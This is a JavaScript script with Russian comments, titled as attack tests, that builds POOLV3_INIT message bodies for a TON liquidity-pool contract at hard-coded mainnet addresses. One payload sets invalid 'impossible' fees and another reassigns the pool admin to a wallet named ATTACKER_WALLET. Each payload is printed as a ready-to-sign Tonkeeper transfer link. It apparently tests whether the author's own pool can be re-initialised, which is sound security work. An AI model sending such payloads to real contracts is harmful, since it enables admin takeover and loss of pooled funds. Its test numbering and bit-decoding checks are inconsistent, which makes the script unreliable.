const { beginCell, Address, toNano } = require('@ton/core');

const POOLV3_INIT = 0x441c39ed;
const POOLV3_SET_FEE = 0x6bdcbeb8;
const IMPOSSIBLE_FEE = 10001;

const NEW_POOL = 'EQBTVxBp0SNUtghiT6sncaP-FgD2omffgwexK0jK9MZErZQ7';
const ADMIN_WALLET = 'UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT';
const ATTACKER_WALLET = 'UQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUatTC';

console.log('=== ATTACK TESTS (исправленная структура - без лишнего бита) ===');
console.log('');

// ========== TEST 1: POOLV3_INIT как в роутере (без minterCell) ==========
console.log('--- TEST 1: POOLV3_INIT как в роутере (без minterCell) ---');
console.log('is_from_admin=1, admin не меняем, fees нет');
console.log('');

const body1 = beginCell()
    .storeUint(POOLV3_INIT, 32)        // op
    .storeUint(0, 64)                  // query_id
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(0, 1)                   // has_admin = false
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 1)                   // has_tickSpacing = false
    // пропускаем 24 бита tickSpacing (всегда есть)
    .storeUint(0, 24)                  // tickSpacing = 0
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    // пропускаем 160 бит sqrtPriceX96 (всегда есть)
    .storeUint(0, 160)                 // sqrtPriceX96 = 0
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(0, 1)                   // activate_pool = false
    .storeUint(IMPOSSIBLE_FEE, 16)    // protocolFee = IMPOSSIBLE_FEE
    .storeUint(IMPOSSIBLE_FEE, 16)    // lpFee = IMPOSSIBLE_FEE
    .storeUint(IMPOSSIBLE_FEE, 16)    // currentFee = IMPOSSIBLE_FEE
    .storeRef(beginCell().endCell())   // nftContentPacked = пустой
    .storeRef(beginCell().endCell())   // nftItemContentPacked = пустой
    // НЕТ storeMaybeRef - как в роутере
    .endCell();

const boc1 = body1.toBoc().toString('base64');
console.log('Body BoC:', boc1);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc1));
console.log('');

// Декодируем для проверки
const check1 = body1.beginParse();
console.log('Проверка TEST 1:');
console.log('  op:', '0x'+check1.loadUint(32).toString(16));
console.log('  is_from_admin:', check1.loadBit());
console.log('  has_admin:', check1.loadBit());
check1.loadUint(2); // skip 2 bits after has_admin=false
console.log('  has_controller:', check1.loadBit());
check1.loadUint(2); // skip 2 bits after has_controller=false
console.log('  has_tickSpacing:', check1.loadBit());
check1.loadUint(24); // tickSpacing
console.log('  has_sqrtPriceX96:', check1.loadBit());
check1.loadUintBig(160); // sqrtPriceX96
console.log('  has_activate_pool:', check1.loadBit());
console.log('  activate_pool:', check1.loadBit());
check1.loadUint(48); // 3 x 16 = fees
console.log('  после fees bits:', check1.remainingBits, 'refs:', check1.remainingRefs);
check1.loadRef();
check1.loadRef();
console.log('  после двух refs bits:', check1.remainingBits, 'refs:', check1.remainingRefs);
console.log('');

// ========== TEST 2: POOLV3_INIT с admin = attacker ==========
console.log('--- TEST 2: POOLV3_INIT с admin = attacker ---');
console.log('is_from_admin=1, admin = второй кошелек');
console.log('');

const body2 = beginCell()
    .storeUint(POOLV3_INIT, 32)
    .storeUint(0, 64)
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(1, 1)                   // has_admin = true
    .storeAddress(Address.parse(ATTACKER_WALLET))  // admin = attacker
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 24)                  // tickSpacing = 0
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    .storeUint(0, 160)                 // sqrtPriceX96 = 0
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(0, 1)                   // activate_pool = false
    .storeUint(IMPOSSIBLE_FEE, 16)
    .storeUint(IMPOSSIBLE_FEE, 16)
    .storeUint(IMPOSSIBLE_FEE, 16)
    .storeRef(beginCell().endCell())
    .storeRef(beginCell().endCell())
    .endCell();

const boc2 = body2.toBoc().toString('base64');
console.log('Body BoC:', boc2);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc2));
console.log('');

// ========== TEST 4: Как TEST 1 но с SET_FEES сперва ==========
console.log('--- TEST 3: POOLV3_INIT с admin = admin + fees=0 (как при деплое) ---');
console.log('is_from_admin=1, admin = admin_wallet, fees=0');
console.log('');

const body3 = beginCell()
    .storeUint(POOLV3_INIT, 32)
    .storeUint(0, 64)
    .storeUint(1, 1)                   // is_from_admin = 1
    .storeUint(0, 1)                   // has_admin = false
    .storeUint(0, 1)                   // has_controller = false
    .storeUint(0, 24)                  // tickSpacing = 0
    .storeUint(0, 1)                   // has_sqrtPriceX96 = false
    .storeUint(0, 160)                 // sqrtPriceX96 = 0
    .storeUint(0, 1)                   // has_activate_pool = false
    .storeUint(0, 1)                   // activate_pool = false
    .storeUint(0, 16)                  // protocolFee = 0
    .storeUint(0, 16)                  // lpFee = 0
    .storeUint(0, 16)                  // currentFee = 0
    .storeRef(beginCell().endCell())
    .storeRef(beginCell().endCell())
    .endCell();

const boc3 = body3.toBoc().toString('base64');
console.log('Body BoC:', boc3);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc3));
